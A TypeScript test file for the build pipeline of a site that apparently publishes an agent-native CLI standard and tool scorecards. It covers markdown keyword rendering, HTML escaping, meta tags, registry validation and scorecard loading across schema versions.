import { describe, expect, test } from 'bun:test';
import { mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { badgeColor, badgeFormat, renderBadgeSvg } from '../src/build/badge.mjs';
import { renderMarkdown } from '../src/build/render.mjs';
import {
  compareVersions,
  computeLayerScore,
  computeLeaderboard,
  computePrincipleScore,
  extractTopIssues,
  loadRegistry,
  loadScoredTools,
  runScorecardInvariants,
} from '../src/build/scorecards.mjs';
import {
  buildLeaderboardBody,
  buildScorecardBody,
  buildScorecardMarkdown,
  renderAudienceBanner,
} from '../src/build/scorecards-render.mjs';
import { emitShell } from '../src/build/shell.mjs';
import { loadSkillData } from '../src/build/skill.mjs';
import { escHtml, parseFilename, SITE_SPEC_VERSION, SPEC_VERSION, sortedGlob } from '../src/build/util.mjs';

describe('sortedGlob', () => {
  test('sorts principles by numeric prefix, not lexicographic', async () => {
    const dir = join(tmpdir(), `sortedGlob-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    try {
      for (const name of ['p10-tenth.md', 'p2-second.md', 'p1-first.md', 'p9-ninth.md', 'notes.md', 'p3-third.md']) {
        await writeFile(join(dir, name), '# stub\n');
      }
      const result = await sortedGlob(dir);
      const names = result.map((p) => p.slice(p.lastIndexOf('/') + 1));
      expect(names).toEqual(['p1-first.md', 'p2-second.md', 'p3-third.md', 'p9-ninth.md', 'p10-tenth.md']);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('parseFilename', () => {
  test('extracts n and slug from bare filename', () => {
    expect(parseFilename('p3-progressive-help-discovery.md')).toEqual({
      n: 3,
      slug: 'progressive-help-discovery',
    });
  });

  test('extracts n and slug from absolute path', () => {
    expect(parseFilename('/some/abs/path/p7-bounded-high-signal-responses.md')).toEqual({
      n: 7,
      slug: 'bounded-high-signal-responses',
    });
  });

  test('throws on non-principle filename', () => {
    expect(() => parseFilename('notes.md')).toThrow();
  });

  test('throws on uppercase prefix', () => {
    expect(() => parseFilename('P1-foo.md')).toThrow();
  });
});

// RFC-keyword regex + plugin cases from docs/DESIGN.md §4.7 (A6/C2).
describe('rfc-keywords plugin', () => {
  async function render(md: string): Promise<string> {
    return renderMarkdown(md);
  }

  test('MUST becomes a single rfc-must strong', async () => {
    const html = await render('The agent MUST run.');
    expect(html).toContain('<strong class="rfc-must">MUST</strong>');
  });

  test('MUST NOT becomes a single rfc-must strong, not two', async () => {
    const html = await render('The agent MUST NOT prompt.');
    expect(html).toContain('<strong class="rfc-must">MUST NOT</strong>');
    expect(html).not.toContain('<strong class="rfc-must">MUST</strong> NOT');
    // Exactly one rfc-must span in this single-keyword sentence.
    const count = (html.match(/class="rfc-must"/g) ?? []).length;
    expect(count).toBe(1);
  });

  test('SHOULD NOT becomes a single rfc-should strong', async () => {
    const html = await render('The tool SHOULD NOT block on prompts.');
    expect(html).toContain('<strong class="rfc-should">SHOULD NOT</strong>');
  });

  test('MAY becomes rfc-may', async () => {
    const html = await render('Callers MAY pass --verbose.');
    expect(html).toContain('<strong class="rfc-may">MAY</strong>');
  });

  test('MUSTARD does not match (word boundary strict)', async () => {
    const html = await render('I like MUSTARD on my burger.');
    expect(html).not.toContain('class="rfc-must"');
    expect(html).toContain('MUSTARD');
  });

  test('lowercase must does not match', async () => {
    const html = await render('The agent must run.');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('MUST inside inlineCode does not match', async () => {
    const html = await render('Use the `MUST` convention.');
    expect(html).not.toContain('class="rfc-must"');
    expect(html).toContain('MUST');
  });

  test('MUST inside fenced code block does not match', async () => {
    const html = await render('```\nMUST run\n```\n');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('MUST inside link label does not match', async () => {
    const html = await render('[MUST see this](https://example.com)');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('trailing comma after MUST still matches', async () => {
    const html = await render('The agent MUST, at minimum, support JSON.');
    expect(html).toContain('<strong class="rfc-must">MUST</strong>');
  });

  test('**MUST:** nested-strong annotates parent, no double strong', async () => {
    // **MUST:** — mdast `strong` with a single text child whose value is
    // `MUST:` (keyword + colon). The plugin should annotate the existing
    // strong rather than nesting a second one.
    const html = await render('**MUST:** this holds always.');
    // Should have a single <strong class="rfc-must"> element containing MUST:,
    // never nested.
    expect(html).not.toContain('<strong class="rfc-must"><strong>');
    expect(html).not.toContain('<strong><strong class="rfc-must">');
    // The annotation should appear (either via the nested-strong branch or
    // the split-children branch — accept both).
    expect(html).toContain('class="rfc-must"');
  });

  test('MUST inside a heading matches', async () => {
    const html = await render('## MUST behave correctly\n\nBody.');
    expect(html).toContain('class="rfc-must"');
  });
});

// Block-level normative treatment — promotes `**KEYWORD:**` paragraphs
// immediately followed by a list into a single `<aside class="normative
// normative--{must,should,may}">` container. See plan
// docs/plans/2026-04-29-001-feat-brand-og-and-block-normative-plan.md, Unit 1.
describe('normative-block plugin', () => {
  async function render(md: string): Promise<string> {
    return renderMarkdown(md);
  }

  function asideMatches(html: string, klass: string): number {
    const re = new RegExp(`<aside\\b[^>]*class="[^"]*\\b${klass}\\b[^"]*"`, 'g');
    return (html.match(re) ?? []).length;
  }

  test('MUST: paragraph followed by list promotes to aside', async () => {
    const html = await render('**MUST:**\n\n- item one\n- item two\n');
    expect(asideMatches(html, 'normative--must')).toBe(1);
    expect(html).toContain('normative--must');
    // The aside contains the original paragraph (with inline rfc-must) and the list.
    expect(html).toMatch(/<aside\b[^>]*>\s*<p>/);
    expect(html).toContain('<strong class="rfc-must">MUST:</strong>');
    expect(html).toMatch(/<ul>\s*<li>item one<\/li>/);
  });

  test('SHOULD: paragraph followed by list promotes with should variant', async () => {
    const html = await render('**SHOULD:**\n\n- consider this\n');
    expect(asideMatches(html, 'normative--should')).toBe(1);
    expect(html).toContain('<strong class="rfc-should">SHOULD:</strong>');
  });

  test('MAY: paragraph followed by list promotes with may variant', async () => {
    const html = await render('**MAY:**\n\n- optional thing\n');
    expect(asideMatches(html, 'normative--may')).toBe(1);
    expect(html).toContain('<strong class="rfc-may">MAY:</strong>');
  });

  test('mid-paragraph MUST stays inline (no promotion)', async () => {
    const html = await render('Tools MUST run non-interactively when stdin is not a TTY.');
    expect(html).not.toContain('<aside');
    const count = (html.match(/<strong class="rfc-must">MUST<\/strong>/g) ?? []).length;
    expect(count).toBe(1);
  });

  test('MUST: paragraph NOT followed by a list stays inline', async () => {
    const html = await render('**MUST:**\n\nNo list here, just prose.\n');
    expect(html).not.toContain('<aside');
    expect(html).toContain('class="rfc-must"');
  });

  test('MUST NOT: in block carries normative--must class (negation does not change variant)', async () => {
    const html = await render('**MUST NOT:**\n\n- forbidden item\n');
    expect(asideMatches(html, 'normative--must')).toBe(1);
    expect(html).toContain('<strong class="rfc-must">MUST NOT:</strong>');
  });

  test('keyword without trailing colon does NOT promote', async () => {
    // `**MUST**\n\n- item` — bold MUST without trailing colon stays inline.
    const html = await render('**MUST**\n\n- item\n');
    expect(html).not.toContain('<aside');
  });

  test('promoted aside contains exactly one strong (no nested-strong regression)', async () => {
    const html = await render('**MUST:**\n\n- item\n');
    expect(html).not.toContain('<strong class="rfc-must"><strong>');
    expect(html).not.toContain('<strong><strong class="rfc-must">');
    const strongs = (html.match(/<strong\b[^>]*class="rfc-must"[^>]*>/g) ?? []).length;
    expect(strongs).toBe(1);
  });

  test('every principle file produces the expected aside count (19 total)', async () => {
    const { readFile } = await import('node:fs/promises');
    const expected: Record<string, number> = {
      'p1-non-interactive-by-default.md': 3,
      'p2-structured-parseable-output.md': 3,
      'p3-progressive-help-discovery.md': 3,
      'p4-fail-fast-actionable-errors.md': 2,
      'p5-safe-retries-mutation-boundaries.md': 2,
      'p6-composable-predictable-command-structure.md': 3,
      'p7-bounded-high-signal-responses.md': 3,
    };
    let total = 0;
    for (const [file, count] of Object.entries(expected)) {
      const md = await readFile(`content/principles/${file}`, 'utf8');
      const html = await render(md);
      const asideCount = (html.match(/<aside\b[^>]*class="[^"]*normative\b/g) ?? []).length;
      expect(asideCount, `${file} aside count`).toBe(count);
      total += asideCount;
    }
    expect(total).toBe(19);
  });

  test('markdown source files are not mutated by the render pipeline', async () => {
    const { readFile } = await import('node:fs/promises');
    const path = 'content/principles/p1-non-interactive-by-default.md';
    const before = await readFile(path, 'utf8');
    await render(before);
    const after = await readFile(path, 'utf8');
    expect(after).toBe(before);
  });

  test('aside badge text contains the literal keyword (color-not-only differentiation, R8)', async () => {
    const html = await render('**MUST:**\n\n- item\n');
    // The keyword text MUST appear inside the aside, so a stylesheet-disabled
    // render still conveys the keyword identity textually.
    const asideMatch = html.match(/<aside\b[^>]*>([\s\S]*?)<\/aside>/);
    expect(asideMatch).not.toBeNull();
    expect(asideMatch![1]).toContain('MUST');
  });
});

// -------------------------------------------------------------------
// escHtml
// -------------------------------------------------------------------

describe('escHtml', () => {
  test('escapes all HTML special characters', () => {
    expect(escHtml('<b>"Tom & Jerry\'s"</b>')).toBe('&lt;b&gt;&quot;Tom &amp; Jerry&#39;s&quot;&lt;/b&gt;');
  });

  test('passes through safe strings unchanged', () => {
    expect(escHtml('hello world')).toBe('hello world');
  });

  test('coerces non-strings', () => {
    expect(escHtml(42)).toBe('42');
  });
});

// -------------------------------------------------------------------
// emitShell — OG image alt-text wiring (R10)
// -------------------------------------------------------------------

describe('emitShell — OG image alt text', () => {
  function shell() {
    return emitShell({
      title: 'P1 — Non-interactive by Default',
      description: 'A principle of the agent-native CLI standard.',
      canonicalPath: '/p1',
      bodyHtml: '<article>body</article>',
      themeInitJs: '/* theme init */',
    });
  }

  test('emits og:image:alt with the canonical OG card description', () => {
    const html = shell();
    expect(html).toContain('property="og:image:alt"');
    expect(html).toContain(
      'content="agent-native CLI standard — anc.dev — a standard for CLIs that agents can operate"',
    );
  });

  test('emits twitter:image:alt with the same description', () => {
    const html = shell();
    expect(html).toContain('name="twitter:image:alt"');
    // Both alt tags share one source-of-truth — same string verbatim.
    const ogMatch = html.match(/property="og:image:alt"\s+content="([^"]+)"/);
    const twMatch = html.match(/name="twitter:image:alt"\s+content="([^"]+)"/);
    expect(ogMatch).not.toBeNull();
    expect(twMatch).not.toBeNull();
    expect(ogMatch![1]).toBe(twMatch![1]);
  });

  test('footer renders v<SITE_SPEC_VERSION> from content/principles/VERSION (not a hardcoded literal)', () => {
    // Regression guard against the v0.1.0 footer drift that shipped with
    // anc.dev v0.1 — the footer must always read SITE_SPEC_VERSION from
    // content/principles/VERSION (the version the site's PROSE has been
    // reconciled to), never the vendored snapshot version (which can be
    // ahead during the manual reconciliation window) and never a hardcoded
    // literal.
    const html = shell();
    expect(html).toContain(`<span>v${SITE_SPEC_VERSION}</span>`);
    // Negative assertion: the prior stub literal must never come back.
    expect(html).not.toContain('<span>v0.1.0</span>');
  });
});

// -------------------------------------------------------------------
// Scorecards module
// -------------------------------------------------------------------

// Reusable scorecard fixture matching the anc check --output json schema.
function makeScorecard(overrides: Partial<{ results: any[]; summary: any }> = {}) {
  const results = overrides.results ?? [
    {
      id: 'p1-non-interactive',
      label: 'Non-interactive by default',
      group: 'P1',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p2-json-output',
      label: 'Structured output support',
      group: 'P2',
      layer: 'behavioral',
      status: 'fail',
      evidence: 'no --output flag',
    },
    {
      id: 'p3-help',
      label: 'Help flag produces useful output',
      group: 'P3',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    { id: 'p3-version', label: 'Version flag works', group: 'P3', layer: 'behavioral', status: 'pass', evidence: null },
    {
      id: 'p4-bad-args',
      label: 'Rejects invalid arguments',
      group: 'P4',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p6-sigpipe',
      label: 'Handles SIGPIPE gracefully',
      group: 'P6',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p6-no-color',
      label: 'Respects NO_COLOR',
      group: 'P6',
      layer: 'behavioral',
      status: 'warn',
      evidence: 'flag not detected',
    },
    { id: 'p7-quiet', label: 'Quiet mode available', group: 'P7', layer: 'behavioral', status: 'pass', evidence: null },
  ];
  const summary = overrides.summary ?? {
    total: results.length,
    pass: results.filter((r: any) => r.status === 'pass').length,
    warn: results.filter((r: any) => r.status === 'warn').length,
    fail: results.filter((r: any) => r.status === 'fail').length,
    skip: results.filter((r: any) => r.status === 'skip').length,
    error: results.filter((r: any) => r.status === 'error').length,
  };
  return { results, summary };
}

// Schema 0.5 fixture — complete scorecard with v0.4 metadata blocks (tool,
// anc, run, target) plus the schema 0.5 `badge` block. Mirrors what the CLI
// emits today; loadScoredTools' invariant requires schema_version === '0.5'.
// (Function name retains "V04" as the historical reference for the metadata
// block additions; the schema bump from 0.4 → 0.5 only added `badge`.)
function makeV04Scorecard(overrides: Record<string, any> = {}) {
  const base = makeScorecard();
  return {
    schema_version: '0.5',
    audience: null,
    audit_profile: null,
    coverage_summary: null,
    summary: base.summary,
    results: base.results,
    tool: { name: 'fixture', binary: 'fixture', version: 'fixture 1.2.3' },
    anc: { version: '0.1.0', commit: 'abc1234' },
    run: {
      invocation: 'anc check --command fixture --output json',
      started_at: '2026-04-30T04:00:00.000000000Z',
      duration_ms: 42,
      platform: { os: 'linux', arch: 'x86_64' },
    },
    target: { kind: 'command', path: null, command: 'fixture' },
    badge: {
      eligible: true,
      score_pct: 100,
      embed_markdown: '[![agent-native](https://anc.dev/badge/fixture.svg)](https://anc.dev/score/fixture)',
      scorecard_url: 'https://anc.dev/score/fixture',
      badge_url: 'https://anc.dev/badge/fixture.svg',
      convention_url: 'https://anc.dev/badge',
    },
    ...overrides,
  };
}

// Schema 0.6 fixture — the 7-status taxonomy. results[] carry per-row `id`,
// `tier`, `check_id`, `confidence`; summary gains opt_out/n_a counters; `anc`
// drops `commit`. This object validates against the CLI's published 0.6
// scorecard JSON Schema (agentnative-cli/schema/scorecard.schema.json).
function makeV06Scorecard(overrides: Record<string, any> = {}) {
  const results = overrides.results ?? [
    {
      id: 'p1-must-no-interactive',
      label: 'Non-interactive by default',
      group: 'P1',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
      confidence: 'high',
      tier: 'must',
      check_id: 'p1-non-interactive',
    },
    {
      id: 'p2-must-schema-when-json',
      label: 'Exposes JSON Schema when --output json is supported',
      group: 'P2',
      layer: 'behavioral',
      status: 'n_a',
      evidence: 'antecedent p2-json-output is opt_out; consequent not applicable',
      confidence: 'high',
      tier: 'must',
      check_id: 'p2-schema-print',
    },
    {
      id: 'p2-json-output',
      label: 'Structured output support',
      group: 'P2',
      layer: 'behavioral',
      status: 'opt_out',
      evidence: 'no --output/--format flag detected',
      confidence: 'high',
      tier: 'should',
      check_id: 'p2-json-output',
    },
    {
      id: 'p3-must-version',
      label: 'Version flag works',
      group: 'P3',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
      confidence: 'high',
      tier: 'must',
      check_id: 'p3-version',
    },
    {
      id: 'p3-should-version-short',
      label: 'Short version alias',
      group: 'P3',
      layer: 'behavioral',
      status: 'warn',
      evidence: '--version present; short alias -V not detected',
      confidence: 'medium',
      tier: 'should',
      check_id: 'p3-version',
    },
    {
      id: 'p6-no-pager-behavioral',
      label: 'Does not spawn a pager',
      group: 'P6',
      layer: 'behavioral',
      status: 'skip',
      evidence: 'could not measure via safe probes',
      confidence: 'medium',
      tier: 'may',
      check_id: 'p6-no-pager',
    },
  ];
  const tally = (s: string) => results.filter((r: any) => r.status === s).length;
  return {
    schema_version: '0.6',
    results,
    summary: {
      total: results.length,
      pass: tally('pass'),
      warn: tally('warn'),
      fail: tally('fail'),
      opt_out: tally('opt_out'),
      n_a: tally('n_a'),
      skip: tally('skip'),
      error: tally('error'),
    },
    coverage_summary: {
      must: { total: 23, verified: 17 },
      should: { total: 14, verified: 9 },
      may: { total: 7, verified: 3 },
    },
    audience: 'mixed',
    audit_profile: null,
    spec_version: '0.4.0',
    tool: { name: 'fixture', binary: 'fixture', version: 'fixture 1.2.3' },
    anc: { version: '0.4.0' },
    run: {
      invocation: 'anc --command fixture',
      started_at: '2026-05-21T17:03:00Z',
      duration_ms: 1240,
      platform: { os: 'linux', arch: 'x86_64' },
    },
    target: { kind: 'command', path: null, command: 'fixture' },
    badge: {
      eligible: false,
      score_pct: 62,
      embed_markdown: null,
      scorecard_url: 'https://anc.dev/score/fixture',
      badge_url: 'https://anc.dev/badge/fixture.svg',
      convention_url: 'https://anc.dev/badge',
    },
    ...overrides,
  };
}

describe('loadRegistry', () => {
  test('parses valid YAML with all required fields', async () => {
    const dir = join(tmpdir(), `registry-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: GitHub CLI
  - name: rg
    repo: BurntSushi/ripgrep
    binary: rg
    language: Rust
    tier: notable
    creator: Andrew Gallant
    description: Fast grep
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(2);
      expect(tools[0].name).toBe('gh');
      expect(tools[1].tier).toBe('notable');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('throws on name with spaces or uppercase', async () => {
    const dir = join(tmpdir(), `registry-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: Claude Code
    repo: anthropics/claude-code
    binary: claude
    language: TypeScript
    tier: agent
    creator: Anthropic
    description: AI coding tool
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/must match/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('throws on duplicate names', async () => {
    const dir = join(tmpdir(), `registry-dup-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: GitHub CLI
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: Duplicate
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/duplicate/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('accepts each known audit_profile value', async () => {
    const dir = join(tmpdir(), `registry-profile-ok-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    // Mirrors the four ExceptionCategory variants in CLI v0.1.3.
    await writeFile(
      registryPath,
      `tools:
  - name: tui-app
    repo: x/tui
    binary: tui
    language: Go
    tier: workhorse
    creator: x
    description: A tui
    audit_profile: human-tui
  - name: file-tool
    repo: x/file
    binary: ft
    language: Rust
    tier: workhorse
    creator: x
    description: A file tool
    audit_profile: file-traversal
  - name: posix-tool
    repo: x/posix
    binary: pt
    language: C
    tier: workhorse
    creator: x
    description: A posix tool
    audit_profile: posix-utility
  - name: diag-tool
    repo: x/diag
    binary: dt
    language: C
    tier: workhorse
    creator: x
    description: A diag tool
    audit_profile: diagnostic-only
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(4);
      expect(tools.map((t: any) => t.audit_profile)).toEqual([
        'human-tui',
        'file-traversal',
        'posix-utility',
        'diagnostic-only',
      ]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('rejects unknown audit_profile (typo guard)', async () => {
    const dir = join(tmpdir(), `registry-profile-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: bad
    repo: x/y
    binary: x
    language: Rust
    tier: workhorse
    creator: x
    description: x
    audit_profile: tui-by-design
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/unknown audit_profile/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('treats missing audit_profile as fine (most tools have none)', async () => {
    const dir = join(tmpdir(), `registry-profile-absent-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: plain
    repo: x/y
    binary: x
    language: Go
    tier: workhorse
    creator: x
    description: x
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(1);
      expect(tools[0].audit_profile).toBeUndefined();
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("rejects when one tool's name collides with another tool's binary slug (U7 redirect safety)", async () => {
    // Concrete failure mode: ripgrep emits a redirect at /score/rg → /score/ripgrep.
    // If the registry later adds `name: rg`, both write to /score/rg.html and the
    // redirect silently overwrites (or is overwritten by) the canonical page.
    const dir = join(tmpdir(), `registry-binary-collision-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: ripgrep
    repo: BurntSushi/ripgrep
    binary: rg
    language: Rust
    tier: workhorse
    creator: x
    install: brew install ripgrep
    description: x
  - name: rg
    repo: x/rg
    binary: rg
    language: Rust
    tier: notable
    creator: y
    install: brew install rg
    description: y
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/collides with another tool's binary slug/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('loadScoredTools — scorecard-driven discovery + registry editorial join', () => {
  test('reads JSON files and joins to registry; registry-without-scorecard becomes a registryOrphan', async () => {
    const dir = join(tmpdir(), `scorecards-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'gh-v2.74.0.json'), JSON.stringify(makeV04Scorecard()));
    try {
      const registry = [
        {
          name: 'gh',
          repo: 'cli/cli',
          binary: 'gh',
          language: 'Go',
          tier: 'workhorse',
          creator: 'GitHub',
          description: 'GitHub CLI',
        },
        {
          name: 'rg',
          repo: 'BurntSushi/ripgrep',
          binary: 'rg',
          language: 'Rust',
          tier: 'notable',
          creator: 'AG',
          description: 'grep',
        },
      ];
      const { tools, warnings } = await loadScoredTools(dir, registry);
      expect(tools).toHaveLength(1);
      expect(tools[0].tool.name).toBe('gh');
      expect(tools[0].scorecard).not.toBeNull();
      expect(warnings.scorecardOrphans).toEqual([]);
      expect(warnings.registryOrphans).toEqual(['rg']); // no scorecard on disk → orphan
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('scorecard-without-registry becomes a scorecardOrphan, excluded from leaderboard', async () => {
    const dir = join(tmpdir(), `scorecards-orphan-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(
      join(dir, 'rogue-v1.0.0.json'),
      JSON.stringify(makeV04Scorecard({ tool: { name: 'rogue', binary: 'rogue', version: '1.0.0' } })),
    );
    try {
      const registry = [
        {
          name: 'gh',
          repo: 'cli/cli',
          binary: 'gh',
          language: 'Go',
          tier: 'workhorse',
          creator: 'GitHub',
          description: 'GitHub CLI',
        },
      ];
      const { tools, warnings } = await loadScoredTools(dir, registry);
      expect(tools).toHaveLength(0); // rogue excluded; gh has no scorecard
      expect(warnings.scorecardOrphans).toEqual(['rogue-v1.0.0.json']);
      expect(warnings.registryOrphans).toEqual(['gh']);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('picks highest-versioned scorecard per slug when multiple files exist', async () => {
    const dir = join(tmpdir(), `scorecards-multi-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'gh-v2.74.0.json'), JSON.stringify(makeV04Scorecard()));
    await writeFile(join(dir, 'gh-v2.92.0.json'), JSON.stringify(makeV04Scorecard()));
    try {
      const registry = [
        {
          name: 'gh',
          repo: 'cli/cli',
          binary: 'gh',
          language: 'Go',
          tier: 'workhorse',
          creator: 'GitHub',
          description: 'GitHub CLI',
        },
      ];
      const { tools } = await loadScoredTools(dir, registry);
      expect(tools).toHaveLength(1);
      expect(tools[0].version).toBe('2.92.0');
      expect(tools[0].scorecardFilename).toBe('gh-v2.92.0.json');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('loadScoredTools — warnings shape (U8 PR-comment annotation)', () => {
  test('warnings is JSON-stringifiable with stable keys (clean corpus)', async () => {
    const dir = join(tmpdir(), `corpus-clean-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'fixture-v1.2.3.json'), JSON.stringify(makeV04Scorecard()));
    try {
      const registry = [
        {
          name: 'fixture',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      const { warnings } = await loadScoredTools(dir, registry);
      // The CI parser does: jq -r '.scorecardOrphans // [] | length' — so the
      // shape contract is "always-present arrays with stable key names."
      const round = JSON.parse(JSON.stringify(warnings));
      expect(round.scorecardOrphans).toEqual([]);
      expect(round.registryOrphans).toEqual([]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("warnings carries each side's offending entry by name (drift PR)", async () => {
    const dir = join(tmpdir(), `corpus-drift-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(
      join(dir, 'orphan-v1.0.0.json'),
      JSON.stringify(makeV04Scorecard({ tool: { name: 'orphan', binary: 'orphan', version: '1.0.0' } })),
    );
    try {
      const registry = [
        {
          name: 'lonely',
          repo: 'a/b',
          binary: 'lonely',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      const { warnings } = await loadScoredTools(dir, registry);
      // Both sides carry one entry → CI emits a comment naming both.
      expect(warnings.scorecardOrphans).toEqual(['orphan-v1.0.0.json']);
      expect(warnings.registryOrphans).toEqual(['lonely']);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('compareVersions', () => {
  test('orders simple SemVer triples', () => {
    expect(compareVersions('0.4', '0.3')).toBeGreaterThan(0);
    expect(compareVersions('0.3', '0.4')).toBeLessThan(0);
    expect(compareVersions('1.2.3', '1.2.3')).toBe(0);
  });

  test('handles future schema bumps (floor admits 0.5+)', () => {
    expect(compareVersions('0.5', '0.4')).toBeGreaterThanOrEqual(0);
    expect(compareVersions('1.0', '0.4')).toBeGreaterThanOrEqual(0);
  });

  test('admits the grandfather schema (1.1 > 0.4)', () => {
    // anc-v0.1.3.json carries schema_version "1.1" — the path-based
    // grandfather is what protects it from invariant (c)/(d), not the
    // version comparator.
    expect(compareVersions('1.1', '0.4')).toBeGreaterThan(0);
  });
});

describe('loadScoredTools — schema 0.4 metadata', () => {
  test('attaches tool/anc/run/target blocks for v0.4 scorecards', async () => {
    const dir = join(tmpdir(), `scorecards-v04-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'fixture-v1.2.3.json'), JSON.stringify(makeV04Scorecard()));
    try {
      const registry = [
        {
          name: 'fixture',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      const { tools } = await loadScoredTools(dir, registry);
      expect(tools).toHaveLength(1);
      const entry: any = tools[0];
      expect(entry.metadata).not.toBeNull();
      expect(entry.metadata.tool.name).toBe('fixture');
      expect(entry.metadata.anc.version).toBe('0.1.0');
      expect(entry.metadata.run.duration_ms).toBe(42);
      expect(entry.metadata.run.platform.os).toBe('linux');
      expect(entry.metadata.target.kind).toBe('command');
      expect(entry.scorecardFilename).toBe('fixture-v1.2.3.json');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('rejects scorecards outside the supported schema set (no synthesis fallback)', async () => {
    // Schemas 0.5 and 0.6 are supported during the migration window. The site
    // reads `scorecard.badge.*` and `scorecard.{tool,anc,run,target}` directly
    // from each scorecard; a scorecard without these blocks would fail render.
    // The load-time invariant fails the build immediately rather than silently
    // render wrong data via a synthesized fallback.
    const dir = join(tmpdir(), `scorecards-invariant-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const stale = {
      schema_version: '0.4',
      audience: null,
      audit_profile: null,
      coverage_summary: null,
      summary: { total: 0, pass: 0, warn: 0, fail: 0, skip: 0, error: 0 },
      results: [],
    };
    await writeFile(join(dir, 'fixture-v1.0.0.json'), JSON.stringify(stale));
    try {
      const registry = [
        {
          name: 'fixture',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      await expect(loadScoredTools(dir, registry)).rejects.toThrow(
        /schema_version "0\.4" not supported.*Site supports schema 0\.5, 0\.6/,
      );
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('loads a schema 0.6 scorecard (7-status taxonomy migration window)', async () => {
    const dir = join(tmpdir(), `scorecards-v06-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'fixture-v1.2.3.json'), JSON.stringify(makeV06Scorecard()));
    try {
      const registry = [
        {
          name: 'fixture',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      const { tools, warnings } = await loadScoredTools(dir, registry);
      expect(tools).toHaveLength(1);
      expect(tools[0].scorecard.schema_version).toBe('0.6');
      expect(tools[0].scorecard.badge.score_pct).toBe(62);
      expect(tools[0].metadata.anc.version).toBe('0.4.0');
      expect(warnings.scorecardOrphans).toEqual([]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('loads schema 0.5 and 0.6 scorecards side by side', async () => {
    const dir = join(tmpdir(), `scorecards-mixed-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'alpha-v1.0.0.json'), JSON.stringify(makeV04Scorecard()));
    await writeFile(
      join(dir, 'beta-v1.2.3.json'),
